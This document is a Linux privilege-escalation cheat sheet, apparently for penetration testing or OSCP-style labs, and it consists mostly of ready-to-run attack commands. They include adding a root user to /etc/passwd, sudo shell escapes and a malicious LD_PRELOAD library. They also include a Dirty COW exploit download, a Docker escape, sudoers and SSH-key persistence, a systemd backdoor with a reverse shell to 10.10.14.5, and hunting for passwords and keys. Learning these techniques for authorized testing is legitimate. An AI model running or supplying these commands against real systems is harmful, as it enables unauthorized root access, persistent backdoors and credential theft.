# Linux Privilege Escalation

## Check current user and group memberships
```bash
id
```

## List all system users
```bash
cat /etc/passwd
```

## Check if /etc/passwd is writable and create new root user
```bash
ls -la /etc/passwd
echo "root2:$(openssl passwd Password123):0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

## Display hostname
```bash
hostname
```

## Check OS distribution and version
```bash
cat /etc/issue
cat /etc/os-release
uname -a
cat /proc/version
lsb_release -a
```

## List all running processes
```bash
ps aux
ps -ef
```

## Monitor processes continuously with pspy
```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

## Watch for password-related processes
```bash
watch -n 1 "ps -aux | grep pass"
```

## Display network interfaces and IP addresses
```bash
ip a
ip addr show
ifconfig
```

## Show routing table
```bash
route
ip route
netstat -rn
```

## List active network connections and listening ports
```bash
ss -anp
ss -tulpn
netstat -anp
netstat -tulpn
```

## Check iptables firewall rules
```bash
ls -la /etc/iptables
iptables -L -n -v
iptables-save
```

## Capture network traffic for credentials
```bash
tcpdump -i lo -A | grep "pass"
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

## List all cron job files
```bash
ls -lah /etc/cron*
```

## Display system-wide crontab
```bash
cat /etc/crontab
```

## List current user's cron jobs
```bash
crontab -l
sudo crontab -l
```

## List cron jobs for all users
```bash
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done
```

## List installed packages on Debian-based systems
```bash
dpkg -l
apt list --installed
```

## List installed packages on RedHat-based systems
```bash
rpm -qa
yum list installed
```

## Find all writable directories
```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

## Find all SUID files
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

## Find all SGID files
```bash
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

## Find files with capabilities set
```bash
/usr/sbin/getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
```

## Display filesystem mount table
```bash
cat /etc/fstab
```

## Show currently mounted filesystems
```bash
mount
df -h
```

## List block devices
```bash
lsblk
```

## List loaded kernel modules
```bash
lsmod
/sbin/modinfo <module_name>
```

## Display environment variables and PATH
```bash
echo $PATH
env
printenv
cat /etc/environment
cat /etc/profile
cat ~/.bashrc
cat ~/.profile
cat ~/.bash_profile
```

## Run unix-privesc-check for automated enumeration
```bash
unix-privesc-check standard > output.txt
unix-privesc-check detailed > output.txt
```

## Download and run LinPEAS
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

## Download and run LinEnum
```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

## Download and run Linux Exploit Suggester
```bash
curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

## Check sudo permissions
```bash
sudo -l
```

## Exploit sudo vi for shell
```bash
sudo vi -c ':!/bin/sh' /dev/null
sudo vi
# Then type: :!/bin/bash
```

## Exploit sudo awk for shell
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

## Exploit sudo find for shell
```bash
sudo find . -exec /bin/sh \; -quit
sudo find / -name test -exec /bin/bash \;
```

## Exploit sudo nmap for shell
```bash
sudo nmap --interactive
# Then type: !sh
```

## Exploit sudo less for shell
```bash
sudo less /etc/hosts
# Then type: !/bin/bash
```

## Exploit PATH hijacking with writable directory
```bash
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

## Check for LD_PRELOAD sudo permission
```bash
sudo -l | grep LD_PRELOAD
```

## Create malicious shared library for LD_PRELOAD exploit
```bash
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so apache2
```

## Search for database configuration files
```bash
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | grep -E "(database|db|mysql|postgres|mongo)"
```

## Search for web application configs
```bash
find /var/www -name "*.php" -o -name "*.config" -o -name "*.ini" 2>/dev/null
grep -r "password\|passwd\|pwd" /var/www/ 2>/dev/null
```

## Search for credentials in common config locations
```bash
grep -r "password\|passwd\|pwd\|pass" /etc/ 2>/dev/null
grep -r "DB_PASSWORD\|DATABASE_PASSWORD" /var/www/ 2>/dev/null
```

## Check bash history for credentials
```bash
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history
cat ~/.vim_history
find /home -name ".*history" 2>/dev/null
```

## Search for SSH private keys
```bash
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find /home -name ".ssh" 2>/dev/null
```

## Check kernel version for exploit research
```bash
uname -r
uname -a
cat /proc/version
```

## Compile and run Dirty COW exploit
```bash
curl -o dirty.c https://www.exploit-db.com/download/40611
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password123
```

## Escape Docker container to host root
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run --rm -v /etc:/mnt/etc -it alpine vi /mnt/etc/passwd
```

## Check if user is in docker group
```bash
id | grep docker
groups | grep docker
```

## Access MySQL as root and execute shell
```bash
mysql -u root -p
\! /bin/bash
```

## Check for MySQL UDF exploits
```bash
searchsploit mysql udf
searchsploit -m 1518
```

## Add user to sudoers file
```bash
echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
echo "attacker ALL=(ALL) NOPASSWD:ALL" | tee -a /etc/sudoers
```

## Install SSH key for persistence
```bash
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh
```

## Create systemd backdoor service
```bash
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
systemctl start backdoor.service
```

## Create nested reverse shell for stability
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/5678 0>&1'
```

## Upgrade shell to fully interactive TTY
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl-Z
stty raw -echo; fg
# Press Enter twice
stty rows 38 cols 116
```

## Search for readable sensitive files
```bash
cat /etc/shadow 2>/dev/null
cat /etc/sudoers 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
```

## Check common application config locations
```bash
cat /var/www/html/config.php 2>/dev/null
ls -la /etc/apache2/sites-enabled/
ls -la /etc/nginx/sites-enabled/
find /opt -name "*.conf" 2>/dev/null
```

---

## Methodology

### Initial Access Strategy
Always create backup shells immediately after initial access:
1. Get initial shell via web exploit
2. Immediately create second shell via different method
3. Upgrade shells and maintain multiple access points

### Enumeration Priority
1. Run automated tools first (LinPEAS, LinEnum)
2. Check sudo permissions
3. Search for SUID/SGID binaries
4. Hunt for credentials in configs and history
5. Check for writable files and directories
6. Enumerate running processes and cron jobs

### Common Privilege Escalation Vectors

**High Priority:**
- Sudo misconfigurations (NOPASSWD, wildcards, etc.)
- SUID/SGID binaries (check GTFOBins)
- Writable /etc/passwd or /etc/shadow
- Docker group membership
- Writable cron jobs or scripts

**Medium Priority:**
- PATH hijacking opportunities
- LD_PRELOAD abuse
- Capabilities on binaries
- Writable service files
- Database running as root

**Low Priority (Last Resort):**
- Kernel exploits (risk of system crash)

### GTFOBins Reference
When you find SUID binaries or sudo permissions, always check:
- https://gtfobins.github.io/#+suid
- https://gtfobins.github.io/#+sudo
- https://gtfobins.github.io/#+capabilities

### Sensitive Files Checklist
- /etc/passwd (writable?)
- /etc/shadow (readable?)
- /etc/group
- /etc/sudoers
- /etc/crontab
- /var/log/auth.log
- /var/log/secure
- /home/*/.ssh/
- /root/.ssh/
- /var/www/html/config.php
- Application configs in /opt and /usr/local

### Resources
- GTFOBins: https://gtfobins.github.io/
- HackTricks Linux PrivEsc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
- OSCP Secret Sauce (pspy process monitoring): https://eins.li/posts/oscp-secret-sauce/
